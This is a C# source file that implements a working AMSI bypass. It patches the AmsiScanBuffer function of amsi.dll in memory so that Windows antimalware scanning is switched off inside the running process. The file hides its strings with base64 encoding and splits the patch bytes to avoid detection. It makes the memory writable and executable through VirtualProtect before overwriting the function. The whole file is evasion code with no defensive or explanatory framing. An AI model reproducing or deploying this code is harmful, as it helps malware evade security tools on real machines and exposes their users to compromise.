public class Amsi
    {
        public static void Bypass()
        {
            string x64 = "uFcA";
            x64 = x64 + "B4DD";
            string x86 = "uFcAB4";
            x86 = x86 + "DCGAA=";
            if (is64Bit())
                PatchA(Convert.FromBase64String(x64));
            else
                PatchA(Convert.FromBase64String(x86));
        }
        private static void PatchA(byte[] patch)
        {
            try
            {
                string liba = Encoding.Default.GetString(Convert.FromBase64String("YW1zaS5kbGw="));
                var lib = Win32.LoadLibraryA(ref liba);//Amsi.dll
                string addra = Encoding.Default.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI="));
                var addr = Win32.GetProcAddress(lib, ref addra);//AmsiScanBuffer
                uint oldProtect;
                Win32.VirtualAllocEx(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, addr, patch.Length);
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
                Console.WriteLine(" [x] {0}", e.InnerException);
            }
        }
        private static bool is64Bit()
        {
            bool is64Bit = true;
            if (IntPtr.Size == 4)
                is64Bit = false;
            return is64Bit;
        }
    }
    class Win32
    {
        public static readonly DelegateVirtualProtect VirtualAllocEx = LoadApi<DelegateVirtualProtect>("kernel32", Encoding.Default.GetString(Convert.FromBase64String("VmlydHVhbFByb3RlY3Q=")));//VirtualProtect
        public delegate int DelegateVirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        #region CreateAPI
        [DllImport("kernel32", SetLastError = true)]
        public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
        public static CreateApi LoadApi<CreateApi>(string name, string method)
        {
            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));
        }
        #endregion
    }
